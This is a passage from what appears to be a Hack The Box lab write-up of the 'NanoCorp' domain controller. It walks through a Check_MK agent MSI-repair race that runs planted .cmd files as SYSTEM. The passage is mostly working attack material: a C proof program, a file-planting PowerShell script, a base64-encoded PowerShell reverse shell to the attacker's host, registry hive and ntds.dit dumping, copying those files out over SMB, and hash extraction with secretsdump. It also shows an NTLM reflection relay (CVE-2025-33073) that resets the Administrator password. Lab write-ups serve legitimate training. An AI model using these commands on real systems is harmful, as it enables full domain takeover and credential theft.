[+] Listening for reverse shells on 0.0.0.0:4545 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 172.21.0.1 • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from DC01~10.129.xx.xx-Microsoft_Windows_Server_2022_Standard-x64-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Basic, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/DC01~10.129.xx.xx-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2025_11_09-23_46_07-380.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Windows\system32> whoami
whoami
nanocorp\web_svc
```

Got ourself as `web_svc`. <br>
&rarr; Let's run again the trigger and check out the `C:\Windows\Temp`.

```powershell
PS C:\Windows\system32> Get-Process | Where-Object {$_.Name -match "check_mk_agent"}
Get-Process | Where-Object {$_.Name -match "check_mk_agent"}

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
    335      17     7068      18432              1268   0 check_mk_agent
```

```powershell
PS C:\Windows\system32> msiexec /fa C:\Windows\Installer\1e6f2.msi
msiexec /fa C:\Windows\Installer\1e6f2.msi
PS C:\Windows\system32> Get-Process | Where-Object {$_.Name -match "check_mk_agent"}
Get-Process | Where-Object {$_.Name -match "check_mk_agent"}

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
    236      15     3720      13316              8180   0 check_mk_agent
```

We can see the different with new PID has been created which mean the trigger works on `web_svc`.

```powershell
PS C:\Windows\system32> dir C:\Windows\Temp
dir C:\Windows\Temp


    Directory: C:\Windows\Temp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         11/3/2025   5:05 PM                vmware-SYSTEM                                                        
-a----        11/10/2025  12:51 AM             53 af397ef28e484961ba48646a5d38cf54.db.ses                              
-a----        11/10/2025  12:51 AM              0 mat-debug-5648.log                                                   
-a----        11/10/2025   2:00 AM          33870 MpCmdRun.log                                                         
-a----        11/10/2025  12:50 AM            102 silconfig.log                                                        
-a----         11/4/2025   3:20 PM         189079 vmware-vmsvc-SYSTEM.log                                              
-a----         11/4/2025   3:18 PM          16602 vmware-vmtoolsd-Administrator.log                                    
-a----        11/10/2025  12:49 AM          20998 vmware-vmtoolsd-SYSTEM.log                                           
-a----        11/10/2025  12:56 AM           4891 vmware-vmtoolsd-web_svc.log                                          
-a----         11/4/2025   3:20 PM          66145 vmware-vmusr-Administrator.log                                       
-a----        11/10/2025  12:56 AM           5980 vmware-vmusr-web_svc.log                                             
-a----        11/10/2025  12:50 AM          20132 vmware-vmvss-SYSTEM.log
```

We can also access to `C:\Windows\Temp` as well.

![NanoCorp Check_MK Agent Malicious](/assets/img/nanocorp-htb-season9/nanocorp-htb-season9_check-mk-agent-malicious.png)

Okay we then use this one to bruteforce pre-plant malicious file. <br>
We need to craft a `C` script to display flag and also proof as well and after that will create `ps1` script using the ideas from the image above. <br>
&rarr; Let's craft it out and upload in to `monitoring_svc` then trigger with `web_svc`.

```c
└─$ cat exploit.c 
#include <windows.h>
#include <stdio.h>

int main() {
    char user[256], buf[4096];
    DWORD sz = sizeof(user);
    
    GetUserNameA(user, &sz);
    CreateDirectoryA("C:\\test", NULL);
    
    FILE *out = fopen("C:\\test\\proof.txt", "w");
    fprintf(out, "USER: %s\n\n", user);
    
    FILE *in = fopen("C:\\Users\\Administrator\\Desktop\\root.txt", "r");
    if (in) {
        while (fgets(buf, sizeof(buf), in)) {
            fprintf(out, "%s", buf);
        }
        fclose(in);
    }
    fclose(out);
    return 0;
}
```

Complied it.

```bash
└─$ x86_64-w64-mingw32-gcc -o exploit.exe exploit.c -static
```

Upload `exploit.exe` to `monitoring_svc`.

```powershell
PS C:\Users\monitoring_svc\AppData\Local\Temp> !upload exploit.exe
uploading to C:\Users\monitoring_svc\AppData\Local\Temp\f4d74ae58eac1c61.tmp
moving from C:\Users\monitoring_svc\AppData\Local\Temp\f4d74ae58eac1c61.tmp to exploit.exe
```

Then the script for bruteforce pre-plant malicious file.

```ps1
Remove-Item C:\Windows\Temp\cmk_all_*.cmd -Force -ErrorAction SilentlyContinue
Write-Host "[*] Planting 14000 files..." -ForegroundColor Yellow
1000..15000 | ForEach-Object {
    $dest = "C:\Windows\Temp\cmk_all_${_}_1.cmd"
    Copy-Item -Path "$env:TEMP\exploit.exe" -Destination $dest -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $dest -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
}
Write-Host "[+] Done! Files planted." -ForegroundColor Green
```

```powershell
$script = @'
Remove-Item C:\Windows\Temp\cmk_all_*.cmd -Force -ErrorAction SilentlyContinue
Write-Host "[*] Planting 14000 files..." -ForegroundColor Yellow
1000..15000 | ForEach-Object {
    $dest = "C:\Windows\Temp\cmk_all_${_}_1.cmd"
    Copy-Item -Path "$env:TEMP\shell.exe" -Destination $dest -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $dest -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
}
Write-Host "[+] Done! Files planted." -ForegroundColor Green
'@
 
$script | Out-File plant.ps1 -Encoding ASCII
```

Now run the `plant.ps1`.

```powershell
PS C:\Users\monitoring_svc\AppData\Local\Temp> .\plant.ps1
[*] Planting 14000 files...
[+] Done! Files planted.
```

After that done, back to `web_svc` and trigger.

```powershell
PS C:\Windows\system32> msiexec /fa "C:\Windows\Installer\1e6f2.msi"
msiexec /fa "C:\Windows\Installer\1e6f2.msi"
```

We can check out `C:\Windows\Temp` to see the output will give out temporary file with `cmk_{}_{}_{}.cmd`.

```powershell
PS C:\Windows\system32> dir C:\Windows\Temp
dir C:\Windows\Temp


    Directory: C:\Windows\Temp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         11/3/2025   5:05 PM                vmware-SYSTEM                                                        
-a----        11/11/2025   1:16 AM             53 af397ef28e484961ba48646a5d38cf54.db.ses                              
-a----        11/11/2025   1:25 AM           7168 cmk_all_2771_1.cmd                                                   
-ar---        11/11/2025   1:25 AM           7168 cmk_all_2772_1.cmd                                                   
-ar---        11/11/2025   1:25 AM           7168 cmk_all_2773_1.cmd
<SNIP>
```

Now back to `monitoring_svc` session and type out proof.

```powershell
PS C:\Users\monitoring_svc\AppData\Local\Temp> type \test\proof.txt
USER: SYSTEM

5d22b3xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Boom! We can see that we are `SYSTEM` and grab our `root.txt` flag. <br>
Thereforce, we can just combine together into one-liner command using powershell to reverse shell back as `SYSTEM`.

Step up our listener.

```bash
└─$ penelope -p 5555
[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 172.21.0.1 • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Then from `web_svc` session run this one-liner command.

```powershell
PS C:\Users\web_svc\AppData\Local\Temp> $ip="10.xx.xx.xx";$ps='$c=New-Object System.Net.Sockets.TCPClient("'+$ip+'",5555);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()';$bytes=[Text.Encoding]::Unicode.GetBytes($ps);$enc=[Convert]::ToBase64String($bytes);$cmd="@echo off`npowershell -NoP -NonI -Exec Bypass -EncodedCommand $enc";Remove-Item C:\Windows\Temp\cmk_all_*.cmd -Force -EA SilentlyContinue;1000..15000|%{$cmd|Out-File "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Encoding ASCII -Force;Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true};msiexec /fa "C:\Windows\Installer\1e6f2.msi"
```

Waiting for few second, probably 20-30s and back to penelope. <br>
In worst case, we can wait for 1 min or else we need to retry again few times :D.

```bash
└─$ penelope -p 5555
[+] Listening for reverse shells on 0.0.0.0:5555 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 172.21.0.1 • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from DC01~10.129.27.195-Microsoft_Windows_Server_2022_Standard-x64-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Basic, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/DC01~10.129.27.195-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2025_11_11-23_04_28-313.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Windows\system32> whoami
nt authority\system
```

Now we can do anything like dump all `sam.hive`, `system.hive`, `security.hive` and `ntds.dit` and transfer back to our kali server to dump our the hashes.

```powershell
PS C:\dump> reg save HKLM\SECURITY C:\dump\sam.hive (same with system and security)
The operation completed successfully.
```

Or we can use [ntdsutil](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)) to dump all in one folder.

```powershell
PS C:\dump> ntdsutil "ac i ntds" "ifm" "create full C:\dump\ntds" q q
C:\Windows\system32\ntdsutil.exe: ac i ntds
Active instance set to "ntds".
C:\Windows\system32\ntdsutil.exe: ifm
ifm: create full C:\dump\ntds
Creating snapshot...
Snapshot set {c8be1510-b7b9-426b-b1d2-b160b8398afe} generated successfully.
Snapshot {79a92e76-03ed-4c7f-8fb8-e291967b912d} mounted as C:\$SNAP_202511110313_VOLUMEC$\
Snapshot {79a92e76-03ed-4c7f-8fb8-e291967b912d} is already mounted.
Initiating DEFRAGMENTATION mode...
     Source Database: C:\$SNAP_202511110313_VOLUMEC$\Windows\NTDS\ntds.dit
     Target Database: C:\dump\ntds\Active Directory\ntds.dit

                  Defragmentation  Status (omplete)

          0    10   20   30   40   50   60   70   80   90  100
          |----|----|----|----|----|----|----|----|----|----|
          ...................................................

Copying registry files...
Copying C:\dump\ntds\registry\SYSTEM
Copying C:\dump\ntds\registry\SECURITY
Snapshot {79a92e76-03ed-4c7f-8fb8-e291967b912d} unmounted.
IFM media created successfully in C:\dump\ntds
ifm: q
C:\Windows\system32\ntdsutil.exe: q
PS C:\dump> dir


    Directory: C:\dump


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/11/2025   3:13 AM                ntds                                                                 
-a----        11/11/2025   3:06 AM          49152 sam.hive                                                             
-a----        11/11/2025   3:09 AM          32768 security.hive                                                        
-a----        11/11/2025   3:06 AM       19161088 system.hive
```

Transfer back.

```bash
└─$ impacket-smbserver share . -smb2support -username 2fa0n -password 2fa0n
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

```powershell
PS C:\dump\ntds\Active Directory> net use \\10.xx.xx.xx\share /user:'2fa0n' '2fa0n'
The command completed successfully.

PS C:\ \\10.xx.xx.xx\share\\*.hive \\10.xx.xx.xx\share\
PS C:\ \\10.xx.xx.xx\share\p\ \\10.xx.xx.xx\share\

PS C:\dump\ntds\Active Directory> copy ntds.dit \\10.xx.xx.xx\share\
```

Then use [impacket-secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) to dump all the hashes out.

```bash
└─$ impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL -ntds ntds.dit 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x02832230a6146258f71e2615506bf7c4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
<SNIP>
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
nanocorp.htb\web_svc:1103:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
nanocorp.htb\monitoring_svc:3101:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:<SNIP>
Administrator:aes128-cts-hmac-sha1-96:<SNIP>
Administrator:des-cbc-md5:<SNIP>
DC01$:aes256-cts-hmac-sha1-96:<SNIP>
DC01$:aes128-cts-hmac-sha1-96:<SNIP>
DC01$:des-cbc-md5:<SNIP>
krbtgt:aes256-cts-hmac-sha1-96:<SNIP>
krbtgt:aes128-cts-hmac-sha1-96:<SNIP>
krbtgt:des-cbc-md5:<SNIP>
nanocorp.htb\web_svc:aes256-cts-hmac-sha1-96:<SNIP>
nanocorp.htb\web_svc:aes128-cts-hmac-sha1-96:<SNIP>
nanocorp.htb\web_svc:des-cbc-md5:<SNIP>
nanocorp.htb\monitoring_svc:aes256-cts-hmac-sha1-96:<SNIP>
nanocorp.htb\monitoring_svc:aes128-cts-hmac-sha1-96:<SNIP>
nanocorp.htb\monitoring_svc:des-cbc-md5:<SNIP>
[*] Cleaning up..
```

Also from the start, we found there is unintended way for this root path and vulnerable to [ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) that we also detected it out when running it to verify.

```bash
└─$ sudo nxc smb dc01.nanocorp.htb -u web_svc -p 'dkxxxxxxxxxxxx' -M ntlm_reflection
[sudo] password for kali: 
SMB         10.129.xx.xx    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.xx.xx    445    DC01             [+] nanocorp.htb\web_svc:dkxxxxxxxxxxxx 
NTLM_REF... 10.129.xx.xx    445    DC01             VULNERABLE (can relay SMB to other protocols except SMB on 10.129.xx.xx)
```

From here, we remeber to our past machine [signed-htb-season9](https://dudenation.github.io/posts/signed-htb-season9/) also got this vulnerable [ntlm-reflection-cve-2025-33073](https://dudenation.github.io/posts/signed-htb-season9/#ntlm-reflection-cve-2025-33073)

### cve-2025-33073 (unintended way)
Also the modified script we have modified from the [signed-htb-season9](https://dudenation.github.io/posts/signed-htb-season9/) so if we want to doing this one, we can check out this blog.

```bash
└─$ python3 CVE-2025-33073-winrm.py -u 'nanocorp.htb\web_svc' -p 'dkxxxxxxxxxxxx' --attacker-ip 10.xx.xx.xx --dns-ip 10.129.xx.xx --dc-fqdn dc01.nanocorp.htb --target dc01.nanocorp.htb --target-ip 10.129.xx.xx --cli-only
[*] Adding malicious DNS record using dnstool.py...
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
[+] DNS record added.
[*] Waiting for DNS record localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.nanocorp.htb to propagate...
[+] DNS record is live.
[*] Starting ntlmrelayx listener in this terminal...
Impacket v0.13.0.dev0+20250930.122532.914efa53 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] Triggering PetitPotam coercion via nxc...
[*] Running PetitPotam silently in this terminal...
[*] Exploit chain triggered.
[*] Running in CLI-only mode. Check this terminal for output.
[*] (SMB): Received connection from 10.129.xx.xx, attacking target winrms://dc01.nanocorp.htb
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.xx.xx against winrms://dc01.nanocorp.htb SUCCEED [1]
[*] winrms:///@dc01.nanocorp.htb [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
[*] All targets processed!
[*] (SMB): Connection from 10.129.xx.xx controlled, but there are no more targets left!
[*] winrms:///@dc01.nanocorp.htb [1] -> WinRM shell destroyed successfully. You can now leave the NC shell :)
```

Got our shell at `127.0.0.1:11000`.

```bash
└─$ nc 127.0.0.1 11000
Type help for list of commands

# net user Administrator p@ssw4rd$
The command completed successfully.

# exit
```

Change the `Administrator` password and then `evil-winrm`.

```powershell
└─$ evil-winrm -i 10.129.xx.xx -u Administrator -p 'p@ssw4rd$' -S -P 5986
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a9f485xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Highly chance that this one just little mistake from author but at the end, the machine is great that we could not expected that user path is really quick and the root path is really interesting with this local privilege with this `check_mk` service :>.

![result](/assets/img/nanocorp-htb-season9/result.png)